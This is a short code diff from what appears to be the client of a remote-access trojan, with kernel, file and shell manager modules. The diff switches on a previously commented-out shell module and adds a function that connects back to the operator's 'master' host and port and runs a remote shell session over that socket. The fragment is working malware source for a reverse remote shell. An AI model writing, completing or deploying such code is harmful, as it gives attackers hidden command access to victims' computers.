@@ -2,7 +2,7 @@
 #include "KernelManager.h"
 #include "FileManager.h"
 
-//#include "ShellManager.h"
+#include "ShellManager.h"
 
 #include "SystemManager.h"
 
@@ -23,18 +23,18 @@ DWORD WINAPI Loop_FileManager(SOCKET sRemote)
 	return 0;
 }
 
-// DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
-// {
-// 	CClientSocket	socketClient;
-// 	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
-// 		return -1;
-// 
-// 	CShellManager	manager(&socketClient);
-// 
-// 	socketClient.run_event_loop();
-// 
-// 	return 0;
-// }
+DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
+{
+	CClientSocket	socketClient;
+	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
+		return -1;
+
+	CShellManager	manager(&socketClient);
+
+	socketClient.run_event_loop();
+
+	return 0;
+}
 
 
 
